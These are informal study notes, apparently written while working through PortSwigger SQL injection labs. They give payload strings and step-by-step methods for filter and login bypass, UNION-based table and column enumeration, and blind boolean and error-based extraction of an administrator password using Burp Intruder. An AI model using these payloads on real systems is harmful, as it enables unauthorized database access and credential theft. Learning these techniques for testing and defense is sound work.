SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
This allows attacker to view data that they are not normally able to retrieve them.




1. How to detect SQLi
  1. add a single quote character ' and look for anomalies
  2. boolean conditions such as OR 1=1, OR 1=2
  3. some payloads trigger time delays
  4. or just use Burp suite




2. Where are the most vulnerabilities
  You ca nfind them at :
  WHERE clause of a SELECT
  UPDATE statements
  INSERT statements
  SELECT statements or in ORDER BY




3. Retrieving hidden data
  1. Example website              https://insecure-website.com/products?category=Gifts
  This cause a SQL query like this: SELECT * FROM products WHERE category = 'Gifts' AND released = 1
  
So released=1 is used to show only objects that are released. You can assume that puting this to 0 expose some items.
  Now you can try something like: https://insecure-website.com/products?category=Gifts'--
  and that triggers:                SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

!!! The -- in sql is a command indicator !!! So the rest of query will be a comment, so in this example it will not check for released=1.

https://insecure-website.com/products?category=Gifts'+OR+1=1--
this will trigger:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
that checks if category is gifts OR 1=1, which always true, so will give all items.

!!! be carefull with OR, you might hit a DELETE !!!




4. Subverting apps logic
A application lets a user named wiener log in with pass bluecheese, the sql query is something like:
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

So you can try to comment the second part of check:
use name administrator'--
and the query is:    SELECT * FROM users WHERE username = 'administrator'--' AND password = ''




5. SQL injection UNION attacks (like logical AND)
when the results of a query are returned within application's responses, you can use the UNION keyword to retrive data.
The UNION keyword enables you to execute on or more SELECT queries.
For example:     SELECT a, b FROM table1 UNION SELECT c, d FROM table2

For UNION to work:
The individual queries must return the same number of columns.
The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:
How many columns are being returned from the original query.
Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
So you try those one be one:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
The one that stops working will give:
The ORDER BY position number 3 is out of range of the number of items in the select list.

or try:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
and get:
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.




6. Database-specific MySQL or Oracle syntax
  in Oracle there is DUAL that you have to use lik this: ' UNION SELECT NULL FROM DUAL--
  in MySQL you can use -- but you need a space after, or you ca nuse the hash character #.




7. Find a string in UNION
  so now that you found how many columns there is with UNION, you need to find the exact column you need. So you use those:
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

if there is an error you will get:  Conversion failed when converting the varchar value 'a' to data type int.
!!! you can put whole strings not only 'a' !!!




8. SQL injection UNION attack to retrieve usefull data
You need to know the number of columns,the tables and the original query like:  
' UNION SELECT username, password FROM users--




9. Retrieving multiple values within a single colimn
  +In Oracle use || as a pipe, for example:   ' UNION SELECT username || '~' || password FROM users--
  it will return something like admin~1234
  +In Microsoft use +
  +In PostgreSQL use ||
  +In MySQL use "space" or CONCAT('foo','bar')

!!!! Find all those at https://portswigger.net/web-security/sql-injection/cheat-sheet  !!!!



10. The steps you do
  1. burp suite
  2. find the number of columns
  3. find where is the data strings (for example: '+UNION+SELECT+NULL,'abc'--)
  4. '+UNION+SELECT+NULL,username||'~'||password+FROM+users--



11. Examine database
  The type/version of database software
  The tables/columns

For first (type/version) use those:
  Database type	    Query
  Microsoft, MySQL	SELECT @@version
  Oracle	          SELECT * FROM v$version
  PostgreSQL	      SELECT version()

  for example:       ' UNION SELECT @@version--
  

Keep in mind that url needs to be url encoded liek this: %27+UNION+SELECT+@@version,+NULL%23
where %23 = #
%27 = '




12. All tables:
  SELECT * FROM information_schema.tables
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'

13. 
  '+UNION+SELECT+'abc','def'--
  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--      ( retrieve list of tables in the database)
  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  (replace users_abcdef with the actual table name you want)
  '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--  (change the password and username)

14. Blind SQLi when an app is vulneable to sqli but it's HTTP responses do not contain the results of SQL queries.
    UNION attack is not effective here.
    1 way: If there is some Cookie: TrackingId= fsfmfcapcnspjafas...
    (for this you go at options of page, then application, cookies and you make the changes there!)
      Then:  the query that you dont see is: SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR...'
      The way there is with something liek that: 
              xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm 
      it will give "Welcome" if the first character of password is greater that m
      Next you do with 't etc.
So you need the burp to find a password (xyz=fmqmfofmo....):
A.  TrackingId=xyz' AND '1'='1     (to chech if is vulnerable or not)
B.  TrackingId=xyz' AND '1'='2    (to see that now it doesnt work)
C.  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a    (if returns, then there is a account administrator)
D.  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a   (this checks the length of password, if its longer than 1)
E.  TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a   (bigger the number until you get error, to find the length)
F.  Now that you know the length go at burp and catch a request and modify:
    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
  and send it to intruder!
  Add $  at $a$, so it can change it automatically.  In the Payloads side panel, check that Simple list is selected, and under Payload configuration add the payloads in the range a - z and 0 - 9. You can select these easily using the Add from list drop-down. 
To be able to tell when the correct character was submitted, you'll need to grep each response for the expression Welcome back. To do this, click on the  Settings tab to open the Settings side panel. In the Grep - Match section, clear existing entries in the list, then add the value Welcome back.
And launch the attack!
you will get the first character!
Then you need to change "(password,2,1)" to get the 2nd, and then 3....etc.
The 2nd way might be error-based

15. Error-based SQLi
Using this technique, you can retrieve data by testing one character at a time:
  xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
A. Check that you get an error: TrackingId=xyz'
B. Check that the error disappears: TrackingId=xyz''     (tat means that the problem was the unclosed quot)
C. Confirm that the server uses SQL query:  TrackingId=xyz'||(SELECT '')||'
If this is invalid then it might use ORACLE or something else:
for oracle: TrackingId=xyz'||(SELECT '' FROM dual)||'    (if no error resived then it uses oracle)
D. Now you have a valid sql query. Try with a random name tyable: TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
If error is returned you are in a good place.
E. Use a table name that is mostly used like users: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
where rownum=1 is important, to prevent query from returning more than one row 
F.  TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (error mesaage)
    TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' (no error message)
So you trigger error messages on true cases. So if you check if a letter is used in a name and return error page, then that means that the letter is correct!!!
G. Try to see if user administrrator is there: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
if you get error page then you are good.
H. To find the length of pass do this several times: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
I. Now that you know the length of pass of administrator send the request to intruder to attack it letter by letter:

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
add $a$ and
use 0-9 and a-z payloads, and you will watch for respawn code 500 for "error" HTTP pages.


16. Extracting sensitive data via verbose SQL error messages. That means that the app sends you error messages with explanacion.
This time you need to use CAST function to convert a type of data to another. For example:
  CAST((SELECT example_column FROM example_table) AS int)
this might return 
  ERROR: invalid input syntax for type integer: "Example data"
  or something like that:
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'SqBicjBZT6YRAH4I''. Expected  char

A. just put ' at the end to see the error
B. TrackingId=ogAZZ...'--
Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
C.  TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--    
you get an error about AND must be boolean so:
D.  TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
And thats a good guery.
E.  TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
but you get a new error about some chars so delete the original id to free space
F.  TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
and get error about returning more than 1 line
G.  TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
and then leaks: ERROR: invalid input syntax for type integer: "administrator"
H.  TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--





